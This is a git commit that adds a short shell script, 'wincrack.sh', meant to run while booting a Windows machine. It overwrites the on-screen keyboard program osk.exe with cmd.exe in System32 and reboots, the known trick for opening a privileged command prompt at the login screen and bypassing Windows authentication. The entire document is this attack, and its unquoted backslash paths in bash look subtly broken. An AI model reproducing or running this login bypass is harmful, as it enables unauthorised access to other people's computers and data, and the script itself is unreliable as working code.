285f782de63af9bc2fdcc935625a6d94047aeff1
Frezer Yirga <37390309+Frrzzr@users.noreply.github.com>
2019-01-16 01:52:39 -0800

    bash script while booting
    changing the file name in the system32 directory

---
+++ wincrack.sh
@@ -0,0 +1,4 @@
+cp C:\Windows\System32\cmd.exe C:\Windows\System32\tempcmd.exe;
+cp C:\Windows\System32\osk.exe C:\Windows\System32\temposk.exe;
+mv C:\Windows\System32\cmd.exe C:\Windows\System32\osk.exe;
+reboot
